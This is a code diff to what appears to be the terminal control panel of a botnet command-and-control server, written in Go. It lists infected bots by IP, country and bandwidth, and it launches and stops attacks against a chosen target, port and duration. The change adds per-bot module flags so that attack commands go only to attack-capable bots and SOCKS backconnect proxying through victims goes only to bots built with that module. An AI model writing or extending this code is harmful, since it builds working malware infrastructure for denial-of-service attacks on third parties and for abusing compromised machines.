@@ -314,16 +314,18 @@ type TUIModel struct {
 
 // BotInfo holds display information about a bot
 type BotInfo struct {
-	ID          string
-	Arch        string
-	IP          string
-	RAM         int64
-	CPU         int
-	Uptime      time.Duration
-	ProcessName string
-	UplinkMbps  float64
-	Country     string
-	Selected    bool
+	ID             string
+	Arch           string
+	IP             string
+	RAM            int64
+	CPU            int
+	Uptime         time.Duration
+	ProcessName    string
+	UplinkMbps     float64
+	Country        string
+	Selected       bool
+	AttacksEnabled bool
+	SocksEnabled   bool
 }
 
 // SocksInfo holds display information about a socks backconnect on a bot
@@ -882,6 +884,13 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			if m.socksNewRelay != "" && m.socksCursor < len(m.bots) {
 				bot := m.bots[m.socksCursor]
 
+				if !bot.SocksEnabled {
+					m.toastMessage = "Bot not built with SOCKS module"
+					m.toastExpiry = time.Now().Add(3 * time.Second)
+					m.socksInputMode = false
+					return m, nil
+				}
+
 				// Send !socks command to backconnect to relay
 				cmd := fmt.Sprintf("!socks %s", m.socksNewRelay)
 				sendToSingleBot(bot.ID, cmd)
@@ -1088,7 +1097,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			count += len(tuiAttacks)
 			tuiAttacks = []TUIAttack{}
 
-			sendToBots("!stop")
+			sendToAttackBots("!stop")
 			neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
 			neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
 			m.toastMessage = neonRed.Render("🛑") + " " + neonGreen.Render(fmt.Sprintf("Stopped %d attack(s)", count))
@@ -1264,15 +1273,17 @@ func (m *TUIModel) refreshBotList() {
 	for id, bot := range botConnections {
 		if bot.authenticated {
 			m.bots = append(m.bots, BotInfo{
-				ID:          id,
-				Arch:        bot.arch,
-				IP:          bot.ip,
-				RAM:         bot.ram,
-				CPU:         bot.cpuCores,
-				Uptime:      time.Since(bot.connectedAt),
-				ProcessName: bot.processName,
-				UplinkMbps:  bot.uplinkMbps,
-				Country:     bot.country,
+				ID:             id,
+				Arch:           bot.arch,
+				IP:             bot.ip,
+				RAM:            bot.ram,
+				CPU:            bot.cpuCores,
+				Uptime:         time.Since(bot.connectedAt),
+				ProcessName:    bot.processName,
+				UplinkMbps:     bot.uplinkMbps,
+				Country:        bot.country,
+				AttacksEnabled: bot.attacksEnabled,
+				SocksEnabled:   bot.socksEnabled,
 			})
 		}
 	}
@@ -1311,8 +1322,8 @@ func (m TUIModel) launchAttack() (tea.Model, tea.Cmd) {
 		cmd = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration)
 	}
 
-	// Send to all bots
-	sendToBots(cmd)
+	// Send only to attack-capable bots
+	sendToAttackBots(cmd)
 
 	// Track the attack in TUI attacks list
 	tuiAttackIDSeq++
